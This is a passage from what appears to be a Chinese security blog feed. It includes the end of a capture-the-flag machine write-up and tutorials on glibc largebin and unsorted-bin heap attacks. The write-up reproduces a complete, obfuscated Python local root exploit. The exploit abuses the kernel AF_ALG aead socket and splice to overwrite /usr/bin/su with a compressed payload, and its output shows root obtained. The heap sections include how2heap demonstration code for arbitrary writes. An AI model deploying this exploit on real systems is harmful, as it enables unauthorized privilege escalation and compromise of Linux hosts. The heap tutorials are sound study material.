<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">os</span> <span class="k">as</span> <span class="n">g</span>
<span class="kn">import</span> <span class="n">zlib</span>
<span class="kn">import</span> <span class="n">socket</span> <span class="k">as</span> <span class="n">s</span>
<span class="kn">import</span> <span class="n">ctypes</span>
<span class="kn">import</span> <span class="n">ctypes.util</span>

<span class="k">def</span> <span class="nf">d</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="c1"># ---- splice replacement for Python &lt; 3.10 ----
</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nc">CDLL</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="nf">find_library</span><span class="p">(</span><span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">),</span> <span class="n">use_errno</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="n">_loff_t_p</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nc">POINTER</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_longlong</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">splice</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span>
    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">,</span>
    <span class="n">_loff_t_p</span><span class="p">,</span>
    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">,</span>
    <span class="n">_loff_t_p</span><span class="p">,</span>
    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_size_t</span><span class="p">,</span>
    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_uint</span><span class="p">,</span>
<span class="p">]</span>
<span class="n">libc</span><span class="p">.</span><span class="n">splice</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ssize_t</span>

<span class="k">def</span> <span class="nf">splice</span><span class="p">(</span><span class="n">fd_in</span><span class="p">,</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">offset_src</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">off_in</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">if</span> <span class="n">offset_src</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">off_val</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_longlong</span><span class="p">(</span><span class="n">offset_src</span><span class="p">)</span>
        <span class="n">off_in</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">pointer</span><span class="p">(</span><span class="n">off_val</span><span class="p">)</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="nf">splice</span><span class="p">(</span><span class="n">fd_in</span><span class="p">,</span> <span class="n">off_in</span><span class="p">,</span> <span class="n">fd_out</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">get_errno</span><span class="p">()</span>
        <span class="k">raise</span> <span class="nc">OSError</span><span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="sh">"</span><span class="s">splice failed</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>
<span class="c1"># ----------------------------------------------
</span>
<span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">cdata</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="mi">38</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">a</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">"</span><span class="s">aead</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">authencesn(hmac(sha256),cbc(aes))</span><span class="sh">"</span><span class="p">))</span>
    <span class="n">h</span> <span class="o">=</span> <span class="mi">279</span>
    <span class="n">v</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">setsockopt</span>
    <span class="nf">v</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nf">d</span><span class="p">(</span><span class="sh">'</span><span class="s">0800010000000010</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">64</span><span class="p">))</span>
    <span class="nf">v</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">u</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>

    <span class="n">o</span> <span class="o">=</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">4</span>
    <span class="n">i</span> <span class="o">=</span> <span class="nf">d</span><span class="p">(</span><span class="sh">'</span><span class="s">00</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">u</span><span class="p">.</span><span class="nf">sendmsg</span><span class="p">(</span>
        <span class="p">[</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">cdata</span><span class="p">],</span>
        <span class="p">[</span>
            <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">),</span>
            <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x10</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">19</span><span class="p">),</span>
            <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x08</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">3</span><span class="p">),</span>
        <span class="p">],</span>
        <span class="mi">32768</span>
    <span class="p">)</span>

    <span class="n">r</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="nf">pipe</span><span class="p">()</span>

    <span class="nf">splice</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">o</span><span class="p">,</span> <span class="n">offset_src</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="nf">splice</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">u</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span> <span class="n">o</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">u</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">t</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/su</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="nf">decompress</span><span class="p">(</span>
    <span class="nf">d</span><span class="p">(</span><span class="sh">"</span><span class="s">78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3</span><span class="sh">"</span><span class="p">)</span>
<span class="p">)</span>

<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="nf">c</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">e</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span>

<span class="n">g</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">su</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>太牛了这个，执行完就root了</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exp.py
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>经群主提示可以爆破root密码，然后用了群友的工具试试，感觉爆破的结果不太对，然后看了subrute.sh的代码发现是利用su命令，但是su在执行exp的时候已经被改写了，只要输入su就能自动切换到root，所以爆破出来才怪怪的吧。话说打靶机的时候完全在想这个cve了，也不知道原本解法是怎么样的。</p>

<p>尝试研究了一下PoC，但是这玩意写的实在太精简了，还有压缩，看不懂一点（最主要的还是本人水平不高，几个系统底层的名词都没听说过），只能大概了解到是利用algif_aead的原地操作机制（毕竟补丁就是把这个机制改了），等等大佬分析再研究吧。</p>]]></content><author><name></name></author><category term="MAZE-SEC" /><summary type="html"><![CDATA[靶机：Cha 作者：群主 靶机ID：640 类型：Linux - Easy]]></summary></entry><entry><title type="html">[PWN]堆的LargebinAttack学习</title><link href="/pwn/2026/04/28/LargebinAttack.html" rel="alternate" type="text/html" title="[PWN]堆的LargebinAttack学习" /><published>2026-04-28T00:00:00+08:00</published><updated>2026-04-28T00:00:00+08:00</updated><id>/pwn/2026/04/28/LargebinAttack</id><content type="html" xml:base="/pwn/2026/04/28/LargebinAttack.html"><![CDATA[<h1 id="largebinattack">LargebinAttack</h1>

<p>和其它堆漏洞的利用差不多，largebin attack也是通过其他可写漏洞改写指针来进行往指定的位置写指定的内容，先来说说largebin 特有的一些机制。
largebin使用的也是双向链表，但比起unsortedbin，多出来了一个跳表机制。
largebin中的chunk通常更大，因此为了方便找到合适的chunk，不同大小的chunk会进行分类，这个分类使用的就是跳表机制，比如0x400、0x410就在同一个size区间，使用同一个头指针，而0x500、0x510，又会使用另一个头指针，其结构如图</p>

<p><img src="/assets/images/2026-04-28-LargebinAttack/ref1.png" alt="ref1" /></p>

<p>为此，largebin除了有fd和bk，还有fd_nextsize和bk_nextsize指针用于不同size区间之间的移动，一般只用到第一个节点的fd_nextsize和bk_nextsize，比如这里0x400的chunk的fd_nextsize就会指向0x500，0x500的bk_nextsize则会指向0x400，这两个指针就是我们要利用的</p>

<p>漏洞存在于malloc的时候，从unsorted bin中进行切割划分，然后将对应chunk置入对应bin的过程中，在较早的glibc（&lt;2.30）的操作中，缺乏对fd_nextsize和bk_nextsize的检查</p>

<p>这里用how2heap中，往stack中写数据来举例：</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 主要漏洞在这里</span>
<span class="cm">/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim-&gt;fd_nextsize = fwd;
                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                  fwd-&gt;bk_nextsize = victim;
                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
              }
              bck = fwd-&gt;bk;

    [...]

    mark_bin (av, victim_index);
    victim-&gt;bk = bck;
    victim-&gt;fd = fwd;
    fwd-&gt;bk = victim;
    bck-&gt;fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */</span>

<span class="c1">// gcc large_bin_attack.c -o large_bin_attack -g</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"This file demonstrates large bin attack by writing a large unsigned long value into stack</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span>
                    <span class="s">"global variable global_max_fast in libc for further fastbin attack</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var1</span> <span class="o">=</span> <span class="mh">0xdead</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var2</span> <span class="o">=</span> <span class="mh">0xbeef</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Let's first look at the targets we want to rewrite on stack:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"stack_var1 (%p): %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="n">stack_var1</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"stack_var2 (%p): %ld</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="n">stack_var2</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x320</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now, we allocate the first large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
                    <span class="s">" the first large chunk during the free()</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Then, we allocate the second large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
                    <span class="s">" the second large chunk during the free()</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Finally, we allocate the third large chunk on the heap at: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span>
                    <span class="s">" the third large chunk during the free()</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span>
                    <span class="s">" [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span>
            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>

    <span class="kt">void</span><span class="o">*</span> <span class="n">p4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span>
                    <span class="s">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span>
                    <span class="s">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span>
                    <span class="s">" [ %p ]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span>
            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p1</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">));</span>

    <span class="n">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span>
                    <span class="s">" [ %p &lt;--&gt; %p ]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span>
            <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">p3</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>

    <span class="c1">//------------VULNERABILITY-----------</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now emulating a vulnerability that can overwrite the freed second large chunk's </span><span class="se">\"</span><span class="s">size</span><span class="se">\"</span><span class="s">"</span>
                    <span class="s">" as well as its </span><span class="se">\"</span><span class="s">bk</span><span class="se">\"</span><span class="s"> and </span><span class="se">\"</span><span class="s">bk_nextsize</span><span class="se">\"</span><span class="s"> pointers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span>
                    <span class="s">" at the head of the large bin freelist. To overwrite the stack variables, we set </span><span class="se">\"</span><span class="s">bk</span><span class="se">\"</span><span class="s"> to 16 bytes before stack_var1 and"</span>
                    <span class="s">" </span><span class="se">\"</span><span class="s">bksiz_nexte</span><span class="se">\"</span><span class="s"> to 32 bytes before stack_var2</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3f1</span><span class="p">;</span>
    <span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">p2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">p2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var2</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>

    <span class="c1">//------------------------------------</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x90</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span>
                    <span class="s">" During this time, targets should have already been rewritten:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"stack_var1 (%p): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var1</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var1</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"stack_var2 (%p): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var2</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>首先，代码分配了一个0x320大小的large chunk(a)，然后接着分配了0x400(b)和0x400(c)的large chunk，当然中间需要分配其它大小的chunk，比如这里是0x20以免free的时候large chunk直接合并了，然后free掉第一个a和第二个b large chunk，这样两个chunk就进入unsorted bin了</p>

<p>接下来分配一个比第一块要小的chunk（0x90的），此时malloc就会在分配的过程前先计算所需，把bin分类一下，这样第二个large chunk b就会被分类为large bin，然后第一个freed large chunk a会切割出一部分用于分配新chunk，剩下的接着放回unsorted bin。再free掉第三个large chunk c，这样第三个chunk也进了unsorted bin。</p>

<p>重点的利用过程来了，对于现在这个已经进large bin的b，利用漏洞（比如uaf）去修改它的size、bk、bk_nextsize，使size变得比0x400小（要比c小，这里例子是0x3f1），bk设为想要写的地址的大小减去16字节，bk_nextsize也设为想要写的地址减去32字节（var1 - 2与var2 - 4）。然后再次malloc，再次触发计算size，此时依然会从第一块a中切割，然后把第三块c的size算了发现应该放入large bin，并且由于修改了第二块的size，此时的c会插入到b前面：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>largebin[i]&lt;-&gt;c&lt;-&gt;b
</code></pre></div></div>

<p>之前是这样</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>largebin[i]&lt;-&gt;b
</code></pre></div></div>

<p>其实在只有一个节点的时候，b的bk_nextsize和fd_nextsize指针都指向b本身的这个插入就会触发漏洞，就会进行写操作。原理如下：
原本b为第一个节点，它负责管理largebin[i]这一条同区间size的xx_nextsize指针，现在插入c，c会变为第一个节点，而b变为第二个，很明显管理xx_nextsize也要跟着交接，涉及到以下漏洞代码：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bck与fwd是相对于插入后的c的
p-&gt;fd_nextsize <span class="o">=</span> fwd<span class="p">;</span> //fwd <span class="o">==</span> b
p-&gt;bk_nextsize <span class="o">=</span> fwd-&gt;bk_nextsize<span class="p">;</span>  
fwd-&gt;bk_nextsize <span class="o">=</span> p<span class="p">;</span>
p-&gt;bk_nextsize-&gt;fd_nextsize <span class="o">=</span> p<span class="p">;</span>
bck <span class="o">=</span> fwd-&gt;bk
</code></pre></div></div>

<p>代入到现在的场景，p就是c，fwd就是b，正常来说，前四行代码分别干了以下事情：
1.把c的fd_nextsize指向b</p>

<p>2.把c的bk_nextsize指向b的bk_nextsize，也是b</p>

<p>3.把b的bk_nextsize指向新插入的c</p>

<p>4.把c的bk_nextsize指向的节点，即b的fd_nextsize指针也指向c</p>

<p>即b和c的xx_nextsize都相互指向</p>

<p>当然，在b的xx_nextsize被改变后，这个插入的逻辑关系就可以不管了，只注意代码执行的时候值的变化就行了</p>

<p>在执行第四行的代码时，与原本是fwd-&gt;bk_nextsize-&gt;fd_nextsize = p，而fwd-&gt;bk_nextsize变成了(var2-4+4)，也就是var2 = p，把p指针当作值写进var2里去了，下图是插入victim后的xx_nextsize指针的指向</p>

<p><img src="/assets/images/2026-04-28-LargebinAttack/ref2.png" alt="ref2" /></p>

<p>除了xx_nextsize的维护过程，后面的fd/bk的维护过程也有漏洞，和unsortedbin差不多，就不多说了，代码如下</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
    <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
    <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[LargebinAttack]]></summary></entry><entry><title type="html">[PWN]堆的Unsorted Bin Attack学习</title><link href="/pwn/2026/04/28/Unsorted-Bin-Attack.html" rel="alternate" type="text/html" title="[PWN]堆的Unsorted Bin Attack学习" /><published>2026-04-28T00:00:00+08:00</published><updated>2026-04-28T00:00:00+08:00</updated><id>/pwn/2026/04/28/Unsorted-Bin-Attack</id><content type="html" xml:base="/pwn/2026/04/28/Unsorted-Bin-Attack.html"><![CDATA[<h1 id="unsorted-bin-attack">Unsorted Bin Attack</h1>

<p>首先，和fastbin的结构不同，unsorted bin的结构是一个双向循环链表，FIFO。和fastbin的指定大小也不同，以下介绍其来源：</p>

<p>1.一个chunk被分割后，如果剩下的部分大于MINSIZE，就会归类到unsorted bin
2.一个chunk被释放后，如果大小不是fastbin chunk，而且也和top chunk不相邻，那么就会放到unsorted bin 
3.当chunk被合并时，如果不和top chunk相邻，那么可能会先把合并的chunk放到unsorted bin</p>

<p>基本的利用方式有两种：unsorted bin leak和unsorted bin attack</p>

<h1 id="unsorted-bin-leak">Unsorted Bin Leak</h1>

<p>由于是双向循环链表，也就意味着“尾”连着“首”，</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>main_arena&lt;-&gt;bin1&lt;-&gt;bin2
   |	              |
   &lt;<span class="nt">------------------</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>此处bin2的fd指针就指着main_arena的一部分（main_arena.bins[0,1]），如果可以泄漏其fd指针，就约等于可以得到main_arena地址，这个地址又是一个sturct_malloc_state类型的全局变量，可以结合libc算出libc的基址。注意思路别太死，这里虽然是泄漏bin2的fd指针，但如果只有一个bin的话，那么它的fd和bk都是指向main_arena的</p>

<p>算偏移又有两种方法，
1.通过__malloc_trim，因为该函数使用了main_arena的地址，可以打开ida打开.so文件找到这个函数分析，IDA中引用该地址的方式类似这样：
R13 = &amp;dword_3EBC40，因此找到这个就等于找到了偏移
2.通过__malloc_hook，main_arena和__malloc_hook有固定偏移，可以直接用工具查出，比如</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwntools</span>
<span class="n">main_arena_offset</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span><span class="p">).</span><span class="n">symbols</span>\<span class="p">[</span><span class="sh">"</span><span class="s">\_\_malloc\_hook</span><span class="sh">"</span>\<span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span>
</code></pre></div></div>

<p>最后是利用部分：</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">unsorted</span> <span class="n">bin</span> <span class="n">attack</span><span class="o">:</span>
          <span class="err">\</span><span class="o">/</span><span class="err">\</span><span class="o">*</span> <span class="n">remove</span> <span class="n">from</span> <span class="n">unsorted</span> <span class="n">list</span> <span class="err">\</span><span class="o">*</span><span class="err">\</span><span class="o">/</span>
